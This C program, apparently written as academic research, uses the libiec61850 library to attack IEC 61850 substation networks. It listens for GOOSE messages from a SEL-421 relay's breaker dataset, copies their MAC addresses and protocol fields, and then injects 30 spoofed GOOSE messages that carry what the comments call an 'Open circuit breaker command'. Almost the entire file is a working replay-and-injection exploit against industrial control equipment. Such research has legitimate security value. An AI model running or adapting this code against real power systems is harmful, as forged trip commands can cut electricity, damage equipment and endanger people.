/*This was coded by Johnatan Oliveira for academic purposes and uses functions and libraries of functions
from the libiec61850 library for GOOSE message handling and network 
monitoring by Michael Zillgith https://libiec61850.com/, the libIEC61850 is released under the GPLv3. */


#include "goose_receiver.h"
#include "goose_subscriber.h"
#include "hal_thread.h"
#include "mms_value.h"
#include "goose_publisher.h"

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

static int running = 1;

int numero = 5;
int cont = 0;
int* ponteiro;

//char vlanTag;
int16_t vlanId;
int8_t vlanPrio;
int32_t appId;

//Variables to store the source MAC address.
uint8_t macBuf[6];
uint8_t macsrcBuf[6];
uint8_t macsrcBuf1;
uint8_t macsrcBuf2;
uint8_t macsrcBuf3;
uint8_t macsrcBuf4;
uint8_t macsrcBuf5;
uint8_t macsrcBuf6;

//Variables to store the destination MAC address.
uint8_t macdstBuf1;
uint8_t macdstBuf2;
uint8_t macdstBuf3;
uint8_t macdstBuf4;
uint8_t macdstBuf5;
uint8_t macdstBuf6;


//Variables for the parameters of the GOOSE protocol.
char goId[60];
char goCbRef[60];
char dataSet[60];
uint32_t confRev;
char ndsCom[60];
char simul[60];
uint32_t stNum;
uint32_t sqNum;
uint32_t timeToLive;
uint64_t timestamp;


void sigint_handler(int signalId)
{
    running = 0;
}

void
gooseListener(GooseSubscriber subscriber, void* parameter)
{
    //Store the names of the datasets from the monitored packets.
    strcpy(dataSet, GooseSubscriber_getDataSet(subscriber));

    //if (!strcmp(dataSet, "SEL_421_distCFG/LLN0$dataset_pottj"))
    //if (!strcmp(dataSet, "ied_protecaoPROT/LLN0$prot_dataset"))
    if (!strcmp(dataSet, "SEL_421_distCFG/LLN0$dataset_disj"))
        //if (!strcmp(dataSet, "ied_protecaoPROT/LLN0$trip2_dataset"))
    {
        //Assigns the source MAC address value from the captured packet.
        GooseSubscriber_getSrcMac(subscriber, macsrcBuf);
        macsrcBuf1 = macsrcBuf[0];
        macsrcBuf2 = macsrcBuf[1];
        macsrcBuf3 = macsrcBuf[2];
        macsrcBuf4 = macsrcBuf[3];
        macsrcBuf5 = macsrcBuf[4];
        macsrcBuf6 = macsrcBuf[5];

        //Assigns the destination MAC address value from the captured packet.
        GooseSubscriber_getDstMac(subscriber, macBuf);
        macdstBuf1 = macBuf[0];
        macdstBuf2 = macBuf[1];
        macdstBuf3 = macBuf[2];
        macdstBuf4 = macBuf[3];
        macdstBuf5 = macBuf[4];
        macdstBuf6 = macBuf[5];

        //Assignment of values to the GOOSE protocol parameters of the message.
        strcpy(goId, GooseSubscriber_getGoId(subscriber));
        strcpy(goCbRef, GooseSubscriber_getGoCbRef(subscriber));
        appId = GooseSubscriber_getAppId(subscriber);
        confRev = GooseSubscriber_getConfRev(subscriber);
        stNum = GooseSubscriber_getStNum(subscriber);
        sqNum = GooseSubscriber_getSqNum(subscriber);
        timeToLive = GooseSubscriber_getTimeAllowedToLive(subscriber);
        timestamp = GooseSubscriber_getTimestamp(subscriber);
        printf("Dataset: %s", dataSet);
        cont += 1;
    }

    printf(" N %d\n", cont);
}

int
main(int argc, char** argv)
{
    int intervalo_sup_sleep = 10000, intervalo_inf_sleep = 1000;
    int intervalo_sleep = 0;
    GooseReceiver receiver = GooseReceiver_create();


    //Set interface
    if (argc > 1) {
        printf("Set interface id: %s\n", argv[1]);
        GooseReceiver_setInterfaceId(receiver, argv[1]);
    }
    else {
        printf("Using interface 3\n");
        GooseReceiver_setInterfaceId(receiver, "3");
    }
    ponteiro = &cont;
    GooseSubscriber subscriber = GooseSubscriber_create("", NULL);
    GooseSubscriber_setObserver(subscriber);
    GooseSubscriber_setListener(subscriber, gooseListener, NULL);

    GooseReceiver_addSubscriber(receiver, subscriber);

    GooseReceiver_start(receiver);
    char data[60];
    if (GooseReceiver_isRunning(receiver)) {
        signal(SIGINT, sigint_handler);

        while (running) {
            Thread_sleep(100);
            if (cont == 2) {
                printf("Confirmed");
                break;
            }
            else {
                printf("\nNot Confirmed: %d\n", strlen(dataSet));
            }
        }
    }
    else {
        printf("Failed to start GOOSE subscriber.\n");
    }

    GooseReceiver_stop(receiver);
    GooseReceiver_destroy(receiver);


    char* interface;

    if (argc > 1)
        interface = argv[1];
    else
        interface = "3";

    printf("Using interface %s\n", interface);

    //Definition of the dataset by the attacker.
    LinkedList dataSetValues = LinkedList_create();

    LinkedList_add(dataSetValues, MmsValue_newBoolean(true)); //Open circuit breaker command.
    LinkedList_add(dataSetValues, MmsValue_newBoolean(false));
    LinkedList_add(dataSetValues, MmsValue_newBoolean(false));

    //Definition of the MAC addresses of the subscriber and publisher.
    CommParameters gooseCommParameters;

    gooseCommParameters.appId = appId;
    gooseCommParameters.dstAddress[0] = macdstBuf1;
    gooseCommParameters.dstAddress[1] = macdstBuf2;
    gooseCommParameters.dstAddress[2] = macdstBuf3;
    gooseCommParameters.dstAddress[3] = macdstBuf4;
    gooseCommParameters.dstAddress[4] = macdstBuf5;
    gooseCommParameters.dstAddress[5] = macdstBuf6;
    gooseCommParameters.vlanId = 1;
    gooseCommParameters.vlanPriority = 4;

    gooseCommParameters.srcAddress[0] = macsrcBuf1;
    gooseCommParameters.srcAddress[1] = macsrcBuf2;
    gooseCommParameters.srcAddress[2] = macsrcBuf3;
    gooseCommParameters.srcAddress[3] = macsrcBuf4;
    gooseCommParameters.srcAddress[4] = macsrcBuf5;
    gooseCommParameters.srcAddress[5] = macsrcBuf6;

    gooseCommParameters.src_timestamp = timestamp;
    gooseCommParameters.time_set = true;

    GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);


    if (publisher) {
        //Insertion of the GOOSE parameters.
        GoosePublisher_setGoCbRef(publisher, goCbRef);
        GoosePublisher_setConfRev(publisher, confRev);
        GoosePublisher_setGoID(publisher, goId);
        //GoosePublisher_setDataSetRef(publisher, "ied_protecaoPROT/LLN0$trip2_dataset");
        //GoosePublisher_setDataSetRef(publisher, "ied_protecaoPROT/LLN0$trip2_dataset");
        //GoosePublisher_setDataSetRef(publisher, "ied_protecaoPROT/LLN0$prot_dataset");
        GoosePublisher_setDataSetRef(publisher, "SEL_421_distCFG/LLN0$dataset_pott");
        //GoosePublisher_setDataSetRef(publisher, "SEL_421_distCFG/LLN0$dataset_disj");
        GoosePublisher_setTimeAllowedToLive(publisher, timeToLive);

        int i = 0;

        for (i = 0; i < 30; i++) {
            GoosePublisher_setSqNum(publisher, sqNum);
            GoosePublisher_setStNum(publisher, stNum);
            intervalo_sleep = (rand() % (intervalo_sup_sleep - intervalo_inf_sleep + 1) + intervalo_inf_sleep);
            Thread_sleep(intervalo_sleep);
            printf("\nMessage Published\n");

            if (i == 31) {
                LinkedList_add(dataSetValues, MmsValue_newBoolean(true));
                printf("\nMessage Published\n");
            }
            else {
                if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
                    printf("Error\n");
                }
            }
        }
        GoosePublisher_destroy(publisher);
    }
    else {
        printf("Failed to create GOOSE publisher.\n");
    }
    LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction)MmsValue_delete);

    return 0;
}